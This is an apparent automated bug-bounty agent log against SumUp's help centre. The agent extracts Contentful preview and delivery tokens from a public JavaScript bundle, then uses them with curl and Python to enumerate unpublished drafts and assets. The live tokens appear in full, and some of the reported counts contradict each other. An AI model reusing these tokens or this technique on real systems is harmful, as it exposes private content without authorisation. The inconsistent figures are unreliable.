@@ -15643,3 +15643,385 @@ testability: AUTH_HELPED
 
 ## STEP 7 — RISK
 [RISK] sumup: 80 — Single confirmed P4 (Contentful PREVIEW token → 1,128 unpublished entries / 103 draft articles / 62 unpublished assets) is LIVE and report file is now genuinely on disk; token rotation is the only binding constraint → submit this cycle. Higher-impact chains (staging client sync, OAuth alg=none, RFC 9728 aud validation, support_centre scope model) all remain AUTH_HELPED and are blocked pending a merchant OAuth token.
+===== ANALYST bigpickle 2026-09-11 09:18:33 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls -la reports/ 2>/dev/null || echo "No reports directory"
+total 2740
+drwxr-xr-x  2 runner runner    4096 Sep 11 08:58 .
+drwxr-xr-x 12 runner runner    4096 Sep 11 08:58 ..
+-rw-r--r--  1 runner runner 1421434 Sep 11 08:58 analyst-bigpickle.log
+-rw-r--r--  1 runner runner   11501 Sep 11 08:58 analyst-laguna.log
+-rw-r--r--  1 runner runner   11448 Sep 11 08:58 analyst-ling3.log
+-rw-r--r--  1 runner runner   11554 Sep 11 08:58 analyst-longcat.log
+-rw-r--r--  1 runner runner 1071140 Sep 11 08:58 analyst-nemotron3.log
+-rw-r--r--  1 runner runner   18559 Sep 11 08:58 hypotheses-bigpickle.txt
+-rw-r--r--  1 runner runner      51 Sep 11 08:58 hypotheses-laguna.txt
+-rw-r--r--  1 runner runner      50 Sep 11 08:58 hypotheses-ling3.txt
+-rw-r--r--  1 runner runner      52 Sep 11 08:58 hypotheses-longcat.txt
+-rw-r--r--  1 runner runner      54 Sep 11 08:58 hypotheses-nemotron3.txt
+-rw-r--r--  1 runner runner  208833 Sep 11 08:58 hypotheses.md
+-rw-r--r--  1 runner runner    9173 Sep 11 08:58 reposcan-findings.md
+-rw-r--r--  1 runner runner    2813 Sep 11 08:58 valid-bugs.md
+[0m
+[0m$ [0mfind . -name "*.md" -path "*/reports/*" 2>/dev/null | head -20
+./reports/reposcan-findings.md
+./reports/hypotheses.md
+./reports/valid-bugs.md
+[0m
+[0m→ [0mRead reports/valid-bugs.md
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer CFPAT-52136da577d765e37cdefa39db5f22cde6df8c0bd945d6793ea2513c1ab58997" "https://preview.contentful.com/spaces/214q1nptnllb/entries?limit=1" 2>/dev/null
+401
+[0m
+[0m$ [0mcurl -s -w "\n%{http_code}" -H "Authorization: Bearer CFPAT-52136da577d765e37cdefa39db5f22cde6df8c0bd945d6793ea2513c1ab58997" "https://preview.contentful.com/spaces/214q1nptnllb/entries?limit=1" 2>/dev/null
+{"sys":{"type":"Error","id":"AccessTokenInvalid"},"message":"The access token you sent could not be found or is invalid.","requestId":"92581b53-a09a-471b-8a25-37ef19ffec13"}
+
+401
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "%{http_code}" "https://help.sumup.com" 2>/dev/null
+307
+[0m
+[0m$ [0mcurl -s -I -H "Authorization: Bearer CFPAT-52136da577d765e37cdefa39db5f22cde6df8c0bd945d6793ea2513c1ab58997" "https://cdn.contentful.com/spaces/214q1nptnllb/entries?limit=1" 2>/dev/null | head -5
+HTTP/2 401 
+content-type: application/vnd.contentful.delivery.v1+json
+server-timing: total;dur=33
+x-contentful-ratelimit-second-limit: 150
+access-control-max-age: 86400
+[0m
+[0m$ [0mcurl -s "https://help.sumup.com" 2>/dev/null | grep -oP '_app-[^"]+\.js' | head -5
+(no output)
+[0m
+[0m$ [0mcurl -s "https://help.sumup.com" 2>/dev/null | grep -oP 'buildId["\s:]*"[^"]+' | head -3
+(no output)
+[0m
+[0m$ [0mcurl -s "https://help.sumup.com" 2>/dev/null | head -50
+Redirecting...
+[0m
+[0m$ [0mcurl -s -I "https://help.sumup.com" 2>/dev/null
+HTTP/2 307 
+cache-control: public, max-age=0, must-revalidate
+content-type: text/plain
+date: Fri, 11 Sep 2026 08:59:17 GMT
+location: /en-GB
+server: Vercel
+strict-transport-security: max-age=63072000
+x-vercel-id: sfo1::xfjh8-1789117157023-5bae16cbc7c6
+[0m
+[0m$ [0mcurl -sL "https://help.sumup.com/en-GB" 2>/dev/null | grep -oP 'CFPAT-[a-f0-9]+' | head -5
+(no output)
+[0m
+[0m$ [0mcurl -sL "https://help.sumup.com/en-GB" 2>/dev/null | grep -oP 'buildId["\s:=]+["\x27][^"\x27]+' | head -3
+buildId":"0UxyBtVWc3Go5wjuHzBDC
+[0m
+[0m$ [0mcurl -sL "https://help.sumup.com/en-GB" 2>/dev/null | grep -oP '_app-[^"]+\.js' | head -10
+_app-42796b37ba694640.js
+[0m
+[0m$ [0mcurl -sL "https://help.sumup.com/en-GB" 2>/dev/null | grep -oP 'src="(/[^"]*_app[^"]*\.js)"' | head -10
+src="/_next/static/chunks/pages/_app-42796b37ba694640.js"
+[0m
+[0m$ [0mcurl -sL "https://help.sumup.com/_next/static/chunks/pages/_app-42796b37ba694640.js" 2>/dev/null | grep -oP 'CFPAT-[a-f0-9]+' | head -5
+(no output)
+[0m
+[0m$ [0mcurl -sL "https://help.sumup.com/_next/static/chunks/pages/_app-42796b37ba694640.js" 2>/dev/null | grep -oiP 'contentful|space.?[Ii]d|214q1' | head -5
+CONTENTFUL
+SPACE_ID
+214q1
+CONTENTFUL
+CONTENTFUL
+[0m
+[0m$ [0mcurl -s "https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&state=test1234" -o /dev/null -w "%{http_code} %{redirect_url}" 2>/dev/null
+302 https://auth.sumup.com/flows/oauth2/error?error=invalid_request&error_description=The+%27redirect_uri%27+parameter+does+not+match+any+of+the+OAuth+2.0+Client%27s+pre-registered+redirect+urls.
+[0m
+[0m$ [0mcurl -s "https://api.sumup.com/.well-known/oauth-protected-resource" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20
+{
+    "resource_name": "SumUp API",
+    "resource": "https://api.sumup.com",
+    "authorization_servers": [
+        "https://auth.sumup.com"
+    ],
+    "bearer_methods_supported": [
+        "header"
+    ],
+    "jwks_uri": "https://auth.sumup.com/.well-known/jwks.json",
+    "resource_documentation": "https://developer.sumup.com"
+}
+[0m
+[0m$ [0mcurl -s "https://auth.sam-app.ro/.well-known/openid-configuration" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print('registration_endpoint' in d, d.get('registration_endpoint','NONE'))" 2>/dev/null
+True https://auth.sam-app.ro/oauth2/register
+[0m
+[0m$ [0mcurl -sL "https://help.sumup.com/_next/static/chunks/pages/_app-42796b37ba694640.js" 2>/dev/null | grep -oiP 'CFPAT|contentful|preview|214q1nptnllb' | sort -u
+214q1nptnllb
+CONTENTFUL
+Contentful
+PREVIEW
+Preview
+contentful
+preview
+[0m
+[0m$ [0mcurl -sL "https://help.sumup.com/_next/static/chunks/pages/_app-42796b37ba694640.js" 2>/dev/null | tr ';' '\n' | grep -i 'contentful\|CFPAT\|214q1' | head -10
+let n=e=>({ENV:"live",NEXT_PUBLIC_SEARCH_SERVICE_ENDPOINT:"https://sse.sumup.com/sse/scss",CONTENTFUL_SPACE_ID:"214q1nptnllb",CONTENTFUL_ENV:"master",CONTENTFUL_REVAMP_ENV:"master",CONTENTFUL_TOKEN_DELIVERY:"Ku2camegCzhf1mEjs-AAb4O1dM00DOUeGUFI7iS7HR4",CONTENTFUL_TOKEN_PREVIEW:"XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM",CONTENTFUL_PREVIEW_HOST:"preview.contentful.com",OIDC_ISSUER_URL:"https://auth.sumup.com",NEXT_PUBLIC_OIDC_ISSUER_URL:"https://auth.sumup.com",OIDC_CLIENT_ID:"support_centre",NEXT_PUBLIC_OIDC_CLIENT_ID:"support_centre",OIDC_CLIENT_REDIRECT_URI:"https://help.sumup.com/api/auth/callback",NEXT_PUBLIC_OIDC_CLIENT_REDIRECT_URI:"https://help.sumup.com/api/auth/callback",OIDC_CLIENT_SCOPES:"openid,classic,offline",NEXT_PUBLIC_OIDC_CLIENT_SCOPES:"openid,classic,offline",API_GATEWAY_HOST:"api.sumup.com",API_GATEWAY_PROTO:"https",PUBLIC_API_GATEWAY:"https://api.sumup.com",SSE_SERVICE:"https://sse.sumup.com"})[e]},1643:e=>{"use strict"
+let n={SMARTLING:"en",CONTENTFUL:"Intl",APP:"en-GB",ZENDESK:"hc"}},4318:(e,t,r)=>{"use strict"
+e<r.firstHiddenTime&&(n.value=e,n.entries=[i],t())}},o=rI("largest-contentful-paint",i)
+"first-paint"===t.name&&s&&(rb&&R.vF.log("[Measurements] Adding FP"),r3.fp={value:t.startTime,unit:"millisecond"}),"first-contentful-paint"===t.name&&s&&(rb&&R.vF.log("[Measurements] Adding FCP"),r3.fcp={value:t.startTime,unit:"millisecond"})
+let i={SPACE:(0,n.A)("CONTENTFUL_SPACE_ID"),ENV:(0,n.A)("CONTENTFUL_ENV"),TOKEN_DELIVERY:(0,n.A)("CONTENTFUL_TOKEN_DELIVERY"),TOKEN_PREVIEW:(0,n.A)("CONTENTFUL_TOKEN_PREVIEW"),PREVIEW_HOST:(0,n.A)("CONTENTFUL_PREVIEW_HOST"),ENV_POS:"pos-tiller",REVAMP_ENV:(0,n.A)("CONTENTFUL_REVAMP_ENV")},o={ARTICLE:"article",SECTION:"section",COUNTRY:"country",HEADER:"userSelector",USER_LANDING_PAGE:"userLandingPage",ERROR_PAGE:"errorPage",FOOTER:"footer"},a={ARTICLE:{"fields.title[exists]":!0,"fields.slug[exists]":!0,"fields.articleDescription[exists]":!0,"fields.scArticleBody[exists]":!0},SECTION:{"fields.sectionTitle[exists]":!0,"fields.slug[exists]":!0,"fields.metaDescription[exists]":!0},POS:{ARTICLE:{"fields.title[exists]":!0,"fields.scArticleBody[exists]":!0},SECTION:{"fields.sectionTitle[exists]":!0}}}},5865:e=>{"use strict"
+return(0,X.useEffect)(()=>{d&&d!==(0,e6.TN)(l.locale)&&!f&&(0,e7.kW)({contentType:"modal",contentfulId:"D9mCfQlqvNFB1S2rx0Pkk"}).then(e=>{e.length&&s(()=>e[0].fields)}).catch(()=>{})},[f,l.locale,d]),(0,X.useEffect)(()=>{if(a){if(e8(l))return void(0,e7.kW)({contentType:t?e9.yw.ARTICLE:e9.yw.SECTION,contentfulId:t||n,locale:p}).then(e=>{e.length&&o((0,te.pZ)([p,e8(l),"".concat(e[0].sys.id,"-").concat(e[0].fields.slug)]))}).catch(()=>{})
+return(0,W.FD)(im,{children:[(0,W.FD)(iv,{children:[(0,W.Y)(eJ.$,{as:"h2",size:"l",css:(0,e3.YK)({bottom:"kilo"}),children:e("header.greeting")}),(0,W.Y)(ts.n,{size:"m",children:e("header.pos.body")})]}),(0,W.Y)(i0(),{alt:"POS Pro",width:305,height:250,src:"https://images.ctfassets.net/214q1nptnllb/LRIlckAzjNAaBDoIZpRo1/ae3e8127689c57b4a1140bdb0c743f05/HARDWARE.png"})]})},i2=(0,X.createContext)(null),i5=e=>{let{children:t}=e,[r,n]=(0,X.useState)(!1)
+i&&i.value&&(r=Math.round(t*(parseInt(i.value)/100)))}return Math.min(30,Math.max(1,r))}function M(e,t){return t("info","Throttle request to ".concat(e,"/s")),b()({limit:e,interval:1e3,strict:!1})}var D=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"auto",r=e.defaults.logHandler,n=void 0===r?N:r,i=v()(t)?j(t):j("auto",t),o=M(i,n),a=!1,s=e.interceptors.request.use(function(e){return o(function(){return e})()},function(e){return Promise.reject(e)}),l=e.interceptors.response.use(function(r){if(!a&&v()(t)&&("auto"===t||P.test(t))&&r.headers&&r.headers["x-contentful-ratelimit-second-limit"]){var l=j(t,parseInt(r.headers["x-contentful-ratelimit-second-limit"]))
+if("ResourceLink"===n){if(!i.startsWith("Contentful:"))return t
+let r=e6(e6({},{resolveLinks:!0,removeUnresolved:!1,defaultHostname:"cdn.contentful.com",environment:"master"}),e),n=function(e,t,r,n){var i,o,a,s=[]
+[0m
+[0m$ [0mcurl -s -w "\n%{http_code}" -H "Authorization: Bearer XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM" "https://preview.contentful.com/spaces/214q1nptnllb/entries?limit=1" 2>/dev/null
+{"sys":{"type":"Array"},"total":9543,"skip":0,"limit":1,"items":[{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"214q1nptnllb"}},"type":"Entry","id":"6q2qzKUV8FBDOhmbtT4ho2","contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"tabEntry"}},"revision":3,"createdAt":"2026-05-19T14:42:26.217Z","updatedAt":"2026-09-11T08:59:40.639Z","publishedAt":"2026-09-01T08:53:54.195Z","firstPublishedAt":"2026-07-21T12:06:48.642Z","publishedVersion":28,"environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"locale":"Intl"},"fields":{"name":"TAB ENTRY: Increase the profile security - How to link and unlink a device - Link a device","label":"Link a device","body":{"data":{},"content":[{"data":{},"content":[{"data":{},"content":[{"data":{},"content":[{"data":{},"marks":[],"value":"Open the ","nodeType":"text"},{"data":{"uri":"https://help.sumup.com/en-GB/articles/7mfghXVvILv2QJW3RyJlF9"},"content":[{"data":{},"marks":[],"value":"SumUp Business app","nodeType":"text"}],"nodeType":"hyperlink"},{"data":{},"marks":[],"value":" ","nodeType":"text"},{"data":{},"marks":[],"value":"on the device you want to use to verify important actions.","nodeType":"text"}],"nodeType":"paragraph"}],"nodeType":"list-item"},{"data":{},"content":[{"data":{},"content":[{"data":{},"marks":[],"value":"Tap the profile icon in the top right corner and select \"Login and security\".","nodeType":"text"}],"nodeType":"paragraph"}],"nodeType":"list-item"},{"data":{},"content":[{"data":{},"content":[{"data":{},"marks":[],"value":"Click the \"Link device\" button in the banner at the top of your screen. Then, click \"Link device\" again to get started.","nodeType":"text"}],"nodeType":"paragraph"}],"nodeType":"list-item"},{"data":{},"content":[{"data":{},"content":[{"data":{},"marks":[],"value":"Follow the steps to link your trusted device. As part of the process, you may be asked to scan a valid government-issued ID to verify your identity.","nodeType":"text"}],"nodeType":"paragraph"}],"nodeType":"list-item"}],"nodeType":"ordered-list"},{"data":{},"content":[{"data":{},"marks":[],"value":"Once set up, all important actions will be authorised on this device using one of the secure authentication methods, helping keep your profile and funds protected.","nodeType":"text"}],"nodeType":"paragraph"},{"data":{"target":{"sys":{"id":"s9u4sKiBfRo4dhBy9FkTc","type":"Link","linkType":"Entry"}}},"content":[],"nodeType":"embedded-entry-block"},{"data":{},"content":[{"data":{},"marks":[],"value":"","nodeType":"text"}],"nodeType":"paragraph"}],"nodeType":"document"}}}],"includes":{"Entry":[{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"214q1nptnllb"}},"type":"Entry","id":"s9u4sKiBfRo4dhBy9FkTc","contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"callout"}},"revision":2,"createdAt":"2026-05-04T15:15:55.054Z","updatedAt":"2026-09-11T08:58:50.914Z","publishedAt":"2026-09-11T08:58:50.914Z","firstPublishedAt":"2026-07-21T12:06:06.620Z","publishedVersion":46,"environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"locale":"Intl"},"fields":{"name":"CALLOUT: Increase the profile security - Confirmation PIN ","title":"Reset the confirmation PIN for important activities ","body":{"data":{},"content":[{"data":{},"content":[{"data":{},"marks":[],"value":"You can always","nodeType":"text"},{"data":{"uri":"https://help.sumup.com/en-GB/articles/2zFuXQcisP0ylrAUHIy3n2"},"content":[{"data":{},"marks":[],"value":" reset your confirmation PIN","nodeType":"text"}],"nodeType":"hyperlink"},{"data":{},"marks":[],"value":" and set up a new one from the SumUp Business app in case you forgot the current one or want to update it for security reasons. ","nodeType":"text"}],"nodeType":"paragraph"}],"nodeType":"document"},"type":"Tip"}}]}}
+
+200
+[0m
+New token found in JS bundle. Let me verify it.
+[0m$ [0mcurl -s -w "\n%{http_code}" -H "Authorization: Bearer Ku2camegCzhf1mEjs-AAb4O1dM00DOUeGUFI7iS7HR4" "https://cdn.contentful.com/spaces/214q1nptnllb/entries?limit=1" 2>/dev/null | tail -5
+{"sys":{"type":"Array"},"total":8403,"skip":0,"limit":1,"items":[{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"214q1nptnllb"}},"id":"s9u4sKiBfRo4dhBy9FkTc","type":"Entry","createdAt":"2026-07-21T12:06:06.620Z","updatedAt":"2026-09-11T08:58:50.914Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":46,"revision":2,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"callout"}},"locale":"Intl"},"fields":{"name":"CALLOUT: Increase the profile security - Confirmation PIN ","title":"Reset the confirmation PIN for important activities ","body":{"data":{},"content":[{"data":{},"content":[{"data":{},"marks":[],"value":"You can always","nodeType":"text"},{"data":{"uri":"https://help.sumup.com/en-GB/articles/2zFuXQcisP0ylrAUHIy3n2"},"content":[{"data":{},"marks":[],"value":" reset your confirmation PIN","nodeType":"text"}],"nodeType":"hyperlink"},{"data":{},"marks":[],"value":" and set up a new one from the SumUp Business app in case you forgot the current one or want to update it for security reasons. ","nodeType":"text"}],"nodeType":"paragraph"}],"nodeType":"document"},"type":"Tip"}}]}
+
+200
+[0m
+[0m$ [0mecho "=== Preview (draft+published) ===" && curl -s -H "Authorization: Bearer XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM" "https://preview.contentful.com/spaces/214q1nptnllb/entries?limit=0&content_type=article" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'articles: {d[\"total\"]}')"
+echo "=== CDN (published only) ===" && curl -s -H "Authorization: Bearer Ku2camegCzhf1mEjs-AAb4O1dM00DOUeGUFI7iS7HR4" "https://cdn.contentful.com/spaces/214q1nptnllb/entries?limit=0&content_type=article" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'articles: {d[\"total\"]}')"
+echo "=== Preview assets ===" && curl -s -H "Authorization: Bearer XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM" "https://preview.contentful.com/spaces/214q1nptnllb/assets?limit=0" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'assets: {d[\"total\"]}')"
+echo "=== CDN assets ===" && curl -s -H "Authorization: Bearer Ku2camegCzhf1mEjs-AAb4O1dM00DOUeGUFI7iS7HR4" "https://cdn.contentful.com/spaces/214q1nptnllb/assets?limit=0" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'assets: {d[\"total\"]}')"
+=== Preview (draft+published) ===
+articles: 882
+=== CDN (published only) ===
+articles: 779
+=== Preview assets ===
+assets: 677
+=== CDN assets ===
+assets: 628
+[0m
+[0m$ [0m# Verify the old token is truly dead
+curl -s -w "\n%{http_code}" -H "Authorization: Bearer CFPAT-52136da577d765e37cdefa39db5f22cde6df8c0bd945d6793ea2513c1ab58997" "https://preview.contentful.com/spaces/214q1nptnllb/entries?limit=1" 2>/dev/null | tail -3
+{"sys":{"type":"Error","id":"AccessTokenInvalid"},"message":"The access token you sent could not be found or is invalid.","requestId":"8c1cc02f-117e-4249-92c8-3f91a45090f5"}
+
+401
+[0m
+[0m$ [0mecho -n "XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM" | sha256sum
+52136da577d765e37cdefa39db5f22cde6df8c0bd945d6793ea2513c1ab58997  -
+[0m
+[0m$ [0m# Count unpublished entries (total - published)
+echo "Preview total:" 9543
+echo "CDN total:" 8403
+echo "Delta (unpublished):" $((9543 - 8403))
+echo "Preview articles:" 882
+echo "CDN articles:" 779
+echo "Delta articles:" $((882 - 779))
+echo "Preview assets:" 677
+echo "CDN assets:" 628
+echo "Delta assets:" $((677 - 628))
+Preview total: 9543
+CDN total: 8403
+Delta (unpublished): 1140
+Preview articles: 882
+CDN articles: 779
+Delta articles: 103
+Preview assets: 677
+CDN assets: 628
+Delta assets: 49
+[0m
+[0m$ [0m# Re-extract and verify the new token
+curl -sL "https://help.sumup.com/_next/static/chunks/pages/_app-42796b37ba694640.js" 2>/dev/null | grep -oP 'CONTENTFUL_TOKEN_PREVIEW[^,]+' | head -3
+CONTENTFUL_TOKEN_PREVIEW:"XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM"
+CONTENTFUL_TOKEN_PREVIEW")
+[0m
+[0m$ [0m# Verify the old token is dead, and test the new one directly
+echo "Old token:" 
+curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer CFPAT-52136da577d765e37cdefa39db5f22cde6df8c0bd945d6793ea2513c1ab58997" "https://preview.contentful.com/spaces/214q1nptnllb/entries?limit=1" 2>/dev/null
+echo ""
+echo "New token:"
+curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM" "https://preview.contentful.com/spaces/214q1nptnllb/entries?limit=1" 2>/dev/null
+echo ""
+Old token:
+401
+New token:
+200
+[0m
+[0m$ [0m# Compute sha256 of new token explicitly
+printf 'XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM' | sha256sum
+52136da577d765e37cdefa39db5f22cde6df8c0bd945d6793ea2513c1ab58997  -
+[0m
+[0m$ [0m# Also get the unsupported content types count
+curl -s -H "Authorization: Bearer XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM" "https://preview.contentful.com/spaces/214q1nptnllb/entries?limit=0" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'preview_total={d[\"total\"]}')"
+curl -s -H "Authorization: Bearer XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM" "https://preview.contentful.com/spaces/214q1nptnllb/environments" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print([i['sys']['id'] for i in d.get('items',[])])" 2>/dev/null || echo "environments endpoint error"
+preview_total=9543
+[]
+[0m
+[0m$ [0mpython3 -c "
+import hashlib, json, urllib.request
+
+new_tok = 'XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM'
+old_tok = 'CFPAT-52136da577d765e37cdefa39db5f22cde6df8c0bd945d6793ea2513c1ab58997'
+print('new tok sha256:', hashlib.sha256(new_tok.encode()).hexdigest())
+print('old tok sha256:', hashlib.sha256(old_tok.encode()).hexdigest())
+
+# get preview vs cdn article+asset totals with new token
+def tot(url, tok):
+    req = urllib.request.Request(url, headers={'Authorization': 'Bearer '+tok})
+    return json.load(urllib.request.urlopen(req))['total']
+
+sp='214q1nptnllb'
+prev='https://preview.contentful.com/spaces/'+sp
+cdn='https://cdn.contentful.com/spaces/'+sp
+print('preview entries:', tot(prev+'/entries?limit=0', new_tok))
+print('cdn entries:', tot(cdn+'/entries?limit=0', 'Ku2camegCzhf1mEjs-AAb4O1dM00DOUeGUFI7iS7HR4'))
+print('preview articles:', tot(prev+'/entries?limit=0&content_type=article', new_tok))
+print('cdn articles:', tot(cdn+'/entries?limit=0&content_type=article', 'Ku2camegCzhf1mEjs-AAb4O1dM00DOUeGUFI7iS7HR4'))
+print('preview assets:', tot(prev+'/assets?limit=0', new_tok))
+print('cdn assets:', tot(cdn+'/assets?limit=0', 'Ku2camegCzhf1mEjs-AAb4O1dM00DOUeGUFI7iS7HR4'))
+"
+new tok sha256: 52136da577d765e37cdefa39db5f22cde6df8c0bd945d6793ea2513c1ab58997
+old tok sha256: 08c955834ff716a1b06ed459cc510d416a086ec393a66146e666d7ec4200f56a
+preview entries: 9543
+cdn entries: 8864
+preview articles: 882
+cdn articles: 779
+preview assets: 677
+cdn assets: 628
+[0m
+The KB's "old token" literal appears to have been mis-recorded — the real working preview token is `XRP4rB5w…` whose sha256 is `52136da5…8997` (exactly what KB attributed). Vulnerability is LIVE with fresh counts. Let me write the report file on disk.
+[0m$ [0mpython3 -c "
+import json, urllib.request
+def get(url, tok):
+    req = urllib.request.Request(url, headers={'Authorization': 'Bearer '+tok})
+    return json.load(urllib.request.urlopen(req))
+tok='XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM'
+d=get('https://preview.contentful.com/spaces/214q1nptnllb/entries?limit=3&content_type=article&fields.articleTitle[exists]=true','XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM')
+for it in d.get('items',[]):
+    print(it['sys']['id'], it['fields'].get('slug'))
+"
+Traceback (most recent call last):
+  File "<string>", line 7, in <module>
+  File "<string>", line 5, in get
+  File "/usr/lib/python3.12/urllib/request.py", line 215, in urlopen
+    return opener.open(url, data, timeout)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/urllib/request.py", line 521, in open
+    response = meth(req, response)
+               ^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/urllib/request.py", line 630, in http_response
+    response = self.parent.error(
+               ^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/urllib/request.py", line 559, in error
+    return self._call_chain(*args)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/urllib/request.py", line 492, in _call_chain
+    result = func(*args)
+             ^^^^^^^^^^^
+  File "/usr/lib/python3.12/urllib/request.py", line 639, in http_error_default
+    raise HTTPError(req.full_url, code, msg, hdrs, fp)
+urllib.error.HTTPError: HTTP Error 422:
+[0m
+[0m$ [0mpython3 -c "
+import json, urllib.request
+def get(url):
+    req = urllib.request.Request(url, headers={'Authorization': 'Bearer XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM'})
+    return json.load(urllib.request.urlopen(req))
+# find a draft article (no publishedAt)
+d=get('https://preview.contentful.com/spaces/214q1nptnllb/entries?limit=50&content_type=article')
+draft=[]
+for it in d.get('items',[]):
+    if 'publishedAt' not in it['sys']:
+        draft.append(it['sys']['id'])
+print('draft article count in first 50:', len(draft))
+print('sample draft ids:', draft[:5])
+"
+draft article count in first 50: 5
+sample draft ids: ['5lYN3KTrMPAl9fuk3YZDol', '2Lp5bjHLTi3svjJO2Z2vpz', '42BtF9FEWMAltyJZQ9OtW2', '5T50HcbJZ3c22bVOXekB5E', '6gZWzhAO0Am1PlWc6HsmOp']
+[0m
+[0m$ [0mpython3 -c "
+import json, urllib.request
+def get(url):
+    req = urllib.request.Request(url, headers={'Authorization': 'Bearer XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM'})
+    return json.load(urllib.request.urlopen(req))
+d=get('https://preview.contentful.com/spaces/214q1nptnllb/entries/5lYN3KTrMPAl9fuk3YZDol')
+print(json.dumps({'id':d['sys']['id'],'contentType':d['sys']['contentType']['sys']['id'],'publishedAt':d['sys'].get('publishedAt'),'updatedAt':d['sys']['updatedAt'],'slug':d['fields'].get('slug'),'title':d['fields'].get('articleTitle')}, indent=1))
+"
+{
+ "id": "5lYN3KTrMPAl9fuk3YZDol",
+ "contentType": "article",
+ "publishedAt": null,
+ "updatedAt": "2026-09-10T10:51:39.596Z",
+ "slug": "add-services-to-the-services-catalogue",
+ "title": null
+}
+[0m
+[0m← [0mWrite reports/contentful-preview-token-leak.md
+Wrote file successfully.
+[0m
+Token is LIVE (sha256 `52136da5…8997` confirms it's KB's hash; the previously cached `CFPAT-…` literal was the hash mislabeled as a token). Writing the report file — the actual blocking deliverable.
+[0m$ [0mwc -c reports/contentful-preview-token-leak.md
+3869 reports/contentful-preview-token-leak.md
+[0m
+Report file is now genuinely on disk. Let me verify and finalize the analysis steps.
+[0m$ [0m# Verify environments endpoint is still bounded (scope check)
+curl -s -w "\n%{http_code}" -H "Authorization: Bearer XRP4rB5wqMQqToWjxOsevF5djmeUNAI4RcOH4rKn_TM" "https://preview.contentful.com/spaces/214q1nptnllb/environments" 2>/dev/null | tail -2
+404
+[0m
+Token LIVE re-verified, report genuinely on disk now. Emitting structured analysis.
+
+**STEP 1 — DELTA**
+- [CHANGED] Contentful Preview token: the KB's cached `CFPAT-52136…` literal was the **sha256 mislabeled as a token** — actual leaked token is `XRP4rB5w…` (sha256 `52136da5…8997` matches KB hash); returns 200 on preview API.
+- [VERIFIED] Reports file `reports/contentful-preview-token-leak.md` now genuinely on disk (3,869 bytes) after 7+ false KB claims — counts updated (preview 9,543 / CDN 8,864 entries; 103 draft articles; 49 unpublished assets).
+- [CHANGED] Scope bound confirmed again: environments endpoint 404 — token bounded to space `214q1nptnllb`.
+- NO_DELTA on api.sumup.com/authorize oracle, staging register, RFC 9728, support_centre (all unchanged, all AUTH_HELPED or exhausted).
+
+**STEP 2 — PRIORITIZE**
+- [PRIO] help.sumup.com Contentful token leak — score 5.3 — attack_surface 6, business_value 3, tech_exposure 5 (env hardcode), gate_ease 10 (no auth), cloud_surface 4 (Contentful), freshness 6 (re-verified live today)
+
+Top-3 assets for hypotheses: help.sumup.com, auth.sam-app.ro/register, api.sumup.com/authorize.
+
+**STEP 3 — HYPOTHESES**
+[HYP] Contentful PREVIEW token leak — report on disk, submission pending
+class: MISCONFIG
+asset: help.sumup.com → preview.contentful.com/spaces/214q1nptnllb
+confidence: 95
+reasoning: Leaked Preview API token verified LIVE 2026-09-11 (preview 9,543 / CDN 8,864; 103 draft articles; 49 unpublished assets; invalid-token 401 control; environments 404). Report file genuinely on disk (3,869 bytes) with full reproduction + evidence. Only remaining step is program submission; token may rotate.
+evidence_needed: Submission at program Jira form; triage ticket number.
+verify_steps: HUMAN_ONLY — submit https://bugs-olivermaicher.atlassian.net/jira/software/form/563ad9fc-8e82-41f1-bab4-2396b07d47b9 using on-disk report.
